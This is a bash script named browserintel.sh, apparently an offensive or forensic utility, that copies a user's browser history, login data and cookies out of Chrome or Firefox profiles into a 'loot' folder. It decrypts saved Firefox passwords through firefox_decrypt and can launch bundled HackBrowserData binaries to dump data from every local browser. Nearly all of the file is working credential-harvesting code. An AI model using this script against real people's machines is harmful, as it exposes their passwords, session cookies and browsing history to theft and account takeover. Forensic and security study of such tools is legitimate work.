#!/usr/bin/env bash

# This script uses python3-based firefox_decrypt for decrypting encrypted Firefox data.
# LICENSE file has been included under tools/firefox_decrypt.
# Please see https://github.com/unode/firefox_decrypt for more details.
#
# Additionally, if run locally with the '-P' and '-L' parameters,
# this script will use a platform-specific golang-based HackBrowserData binary.
# LICENSE file has been included under tools/hackbrowserdata.
# Please see https://github.com/moonD4rk/HackBrowserData for more details.

cd "$(dirname "$0")" || exit 1
workdir="$PWD"
logfile="${workdir}/stdout.log"
loot="${workdir}/loot"
#RED='\033[0;31m'
#NORMAL='\033[0m'

# Make sure required software is installed:
for pkg in {sqlite3,python3}; do
  if ! command -v "$pkg" >/dev/null 2>&1; then
    echo "Please install ${pkg} before running this script."
    exit 1
  fi
done

usage() {
  echo "
Usage: ./browserintel.sh <-P [platform]> <-u [username]> <-b [browser]> [options]
Options (strings):
  -u | --user		username	[-u username] (optional)				Default: user
  -p | --pass		password to decrypt any encrypted data [-p password] (optional)		Default: [None]
  -b | --browser	browser name	[-b chrome|firefox|palemoon|waterfox] (optional) 	Default: chrome
  -B | --browser-dir	browser dir	[-B /path/to/browser_dir] (not necessary for -h, -l, or -c)
  -S | --profile	specific profile (if -S is specified, that profile will be used. Automatically detected with '-B')
  -P | --platform	platform type	[-P win32|win64|linux|darwin] (optional - requires -L)	Default: [None]
  -f | --history	history file	[-h '/path/to/history_db']
  -l | --logindata	login data file	[-l '/path/to/logindata_db']
  -c | --cookies	cookies file	[-c '/path/to/cookies_db']
  -h | --help		display this help text and exit

Options (boolean):
  -A | --all		get local data from all browsers (requires -L and -P)			Default: False
  -C | --cookies-true	get cookies	[-B '/path/to/browser_dir' -C]				Default: False
  -D | --logindata-true get login data	[-B '/path/to/browser_dir' -L]				Default: False
  -H | --history-true	get history	[-B '/path/to/browser_dir' -H]				Default: False
  -L | --local		get data from localhost (requires authentication) [-P platform -L] 	Default: False
"
exit 1
}

# Parse arguments:
while [[ "$#" -gt 0 ]]; do
  case $1 in
    -u|--user) USERNAME="$2"; shift; shift ;;
    -p|--pass) PASSWORD="$2"; shift; shift ;;
    -b|--browser) BROWSER_NAME="$2"; shift; shift ;;
    -B|--browser-dir) BROWSER_DIR="$2"; shift; shift;;
    -S|--profile) SPECIFIC_PROFILE="$2"; shift; shift;;
    -f|--history) HISTORY="$2"; shift; shift;;
    -l|--logindata) LOGIN_DATA="$2"; shift; shift ;;
    -c|--cookies) COOKIES="$2"; shift; shift ;;
    -P|--platform) PLATFORM="$2"; shift; shift ;;
    -A|--all) ALL=1; shift ;;
    -C|--cookies-true) COOKIES_TRUE=1; shift ;;
    -D|--logindata-true) LOGIN_DATA_TRUE=1; shift ;;
    -H|--history-true) HISTORY_TRUE=1; shift ;;
    -L|--local) LOCAL=1; shift ;;
    *) usage; shift; shift ;;
  esac
done

timestamp() { date "+[%Y-%m-%d %I:%M:%S.%N %p %z] "; }

timelog() { sed -r "s@(.*)@$(timestamp)\1@g" | tee -a "$logfile" 2>&1; }

log() { tee -a "$logfile" 2>&1; }

preflight_checks() {
  if [[ -z "$USERNAME" ]]; then
    USERNAME='user'
  fi
  if [[ -z $BROWSER_NAME ]]; then
    BROWSER_NAME='chrome'
  else
    BROWSER_NAME="$(echo "$BROWSER_NAME" | tr "[:upper:]" "[:lower:]")"
  fi
  if [[ -n $BROWSER_DIR ]]; then
    if [[ "$BROWSER_NAME" = "chrome" ]]; then
      BROWSER_DIR="$(find "$BROWSER_DIR" -type d -maxdepth 1 \( -iname "Profile*" -o -iname "*default*" \) -print0 | xargs -0 du -s | sort -rn | awk -F '\t' '{print $NF}' | head -1)"
    else
      BROWSER_DIR="$(find "${BROWSER_DIR}/Profiles" -type d -maxdepth 1 -iname "*default*" -print0 | xargs -0 du -s | sort -rn | awk -F '\t' '{print $NF}' | head -1)"
    fi
  fi
  if [[ -n $SPECIFIC_PROFILE ]]; then
    BROWSER_DIR="$SPECIFIC_PROFILE"
  fi
}

prepare() {
  true > "$logfile"
  echo -e "Started.\n" | timelog
  mkdir -p "$loot"
  BOOTY="${loot}/${USERNAME}"
  echo "Creating directory for loot at ${BOOTY}..." | timelog
  mkdir -p "$BOOTY"
  cd "$BOOTY" || exit 1
  echo "Removing any existing loot in ${BOOTY}..." | timelog
  rm -rf ./*
}

get_history() {
  if [[ (-z $HISTORY) && (-n "$BROWSER_DIR") ]]; then
    if [[ "$BROWSER_NAME" = "chrome" ]]; then
      HISTORY="$(find "$BROWSER_DIR" -type f -name "History" -print0 | xargs -0 du | sort -rn | awk -F '\t' '{print $2}' | head -1)"
    else
      HISTORY="$(find "$BROWSER_DIR" -type f -name "places.sqlite" -print0 | xargs -0 du | sort -rn | awk -F '\t' '{print $2}' | head -1)"
    fi
  fi
  echo "Temporarily copying ${HISTORY} to ${BOOTY}..." | timelog
  cp -v "$HISTORY" . | timelog
  echo -e "Dumping browser history...\n" | timelog
  if [[ "$BROWSER_NAME" = "chrome" ]]; then
    sqlite3 -separator ',' History ".headers on" "select datetime(last_visit_time/1000000-11644473600,'unixepoch'),url from urls order by last_visit_time asc" | tee chrome_history.csv
    echo -e "\nHistory log is available at ${BOOTY}/chrome_history.csv" | timelog
  else
    sqlite3 -separator ',' places.sqlite ".headers on" "select datetime(h.visit_date/1000000,'unixepoch'),p.url from moz_historyvisits as h, moz_places as p where p.id == h.place_id order by h.visit_date asc;" | tee mozilla_history.csv
    echo -e "\nHistory log is available at ${BOOTY}/mozilla_history.csv" | timelog
  fi
  rm -f "History" "places.sqlite"*
}

get_logindata() {
  if [[ (-z $LOGIN_DATA) && (-n "$BROWSER_DIR") ]]; then
    if [[ "$BROWSER_NAME" = "chrome" ]]; then
      LOGIN_DATA="$(find "$BROWSER_DIR" -type f -name "Login Data" -print0 | xargs -0 du | sort -rn | awk -F '\t' '{print $2}' | head -1)"
    else
      profiles=$(python3 "${workdir}"/tools/firefox_decrypt/firefox_decrypt.py -l 2>/dev/null)
      partial_profile="$(echo "$BROWSER_DIR" | awk -F '/' '{print $NF}')"
      profile_number=$(echo "$profiles" | grep "$partial_profile" | awk '{print $1}')
      echo -e "Dumping Login Data...\n" | timelog
      echo "$PASSWORD" | python3 "${workdir}"/tools/firefox_decrypt/firefox_decrypt.py -nc "$profile_number" --format csv --csv-delimiter ',' | tee mozilla_logindata.csv
      echo -e "\nLogin Data information is available at ${BOOTY}/mozilla_logindata.csv" | timelog
    fi
  fi
  if [[ "$BROWSER_NAME" = "chrome" ]]; then
    echo "Temporarily copying ${LOGIN_DATA} to ${BOOTY}..." | timelog
    cp -v "$LOGIN_DATA" . | timelog
    echo -e "Dumping Login Data...\n" | timelog
    sqlite3 -separator ',' 'Login Data' ".headers on" "select date_created, date_last_used, origin_url, action_url, username_value from logins order by date_created" | tee chrome_logindata.csv
    rm -f "Login Data"
    echo -e "\nLogin Data information is available at ${BOOTY}/chrome_logindata.csv" | timelog
  fi
}

get_cookies() {
  if [[ (-z $COOKIES) && (-n "$BROWSER_DIR") ]]; then
    if [[ "$BROWSER_NAME" = "chrome" ]]; then
      COOKIES="$(find "$BROWSER_DIR" -type f -name "Cookies" -print0 | xargs -0 du | sort -rn | awk -F '\t' '{print $2}' | head -1)"
    else
      COOKIES="$(find "$BROWSER_DIR" -type f -name "cookies.sqlite" -print0 | xargs -0 du | sort -rn | awk -F '\t' '{print $2}' | head -1)"
    fi
  fi
  echo "Temporarily copying ${COOKIES} to ${BOOTY}..." | timelog
  cp -v "$COOKIES" . | timelog
  echo -e "Dumping Cookies Data...\n" | timelog
  if [[ "$BROWSER_NAME" = "chrome" ]]; then
    echo 'Cookie information is not currently available Chrome.' | timelog; exit 1
  else
    sqlite3 -separator ',' cookies.sqlite ".headers on" "select * from moz_cookies order by host" | tee mozilla_cookies.csv
  fi
  rm -f "Cookies" "cookies.sqlite"*
  echo -e "\nCookie information is available at ${BOOTY}/mozilla_cookies.csv" | timelog
}

do_hack_browser_data() {
  if [[ "$PLATFORM" = "win32" ]]; then
    hackbrowserdata="${workdir}/tools/hackbrowserdata/hbd-win32.exe"
  elif [[ "$PLATFORM" = "win64" ]]; then
    hackbrowserdata="${workdir}/tools/hackbrowserdata/hbd-win64.exe"
  elif [[ "$PLATFORM" = "linux" ]]; then
    hackbrowserdata="${workdir}/tools/hackbrowserdata/hbd-linux64"
  elif [[ "$PLATFORM" = "darwin" ]]; then
    hackbrowserdata="${workdir}/tools/hackbrowserdata/hbd-darwin"
  else
    echo 'Platform not supported.' | timelog; exit 1
  fi
  if [[ -n $ALL ]]; then
    "${hackbrowserdata}"
  elif [[ -n $BROWSER_NAME ]]; then
    "${hackbrowserdata}" --browser "$BROWSER_NAME"
  elif [[ -n $BROWSER_DIR ]]; then
    "${hackbrowserdata}" --profile-dir-path "$BROWSER_DIR"
  fi
  mv "results"/* . >/dev/null 2>&1
  rmdir results >/dev/null 2>&1
}

#####################################################
# DO WORK:
#####################################################
preflight_checks
prepare
if [[ (-n $HISTORY) || (-n $HISTORY_TRUE) ]]; then
  get_history
fi
if [[ (-n $LOGIN_DATA) || (-n $LOGIN_DATA_TRUE) ]]; then
  get_logindata
fi
if [[ (-n $COOKIES) || (-n $COOKIES_TRUE) ]]; then
  get_cookies
fi
if [[ (-n $LOCAL) && (-n $PLATFORM) ]]; then
  do_hack_browser_data
fi
echo -e "\n${BOOTY}:\n$(ls -lha "${BOOTY}")" | timelog
echo -e "\nFinished." | timelog
